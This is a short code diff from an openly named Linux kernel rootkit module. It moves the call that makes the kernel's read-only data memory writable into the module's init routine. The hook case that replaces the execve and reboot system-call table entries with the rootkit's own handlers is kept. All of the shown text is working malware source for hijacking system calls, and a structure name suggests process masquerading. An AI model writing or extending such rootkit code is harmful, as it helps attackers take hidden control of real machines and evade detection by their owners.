@@ -117,7 +117,6 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
     struct masq_proc *masq;
     switch(ioctl) {
         case IOCTL_MOD_HOOK:
-            update_mapping_prot_(__pa_symbol(__start_rodata_), __start_rodata_, __end_rodata_ - __start_rodata_, PAGE_KERNEL);
             sys_call_table_[__NR_execve] = hook_execve;
             sys_call_table_[__NR_reboot] = hook_reboot;
             break;
@@ -223,6 +222,8 @@ static int __init rootkit_init(void)
 	}
 
     ksym_lookup();
+
+    update_mapping_prot_(__pa_symbol(__start_rodata_), __start_rodata_, __end_rodata_ - __start_rodata_, PAGE_KERNEL);
 
 	return 0;
 }
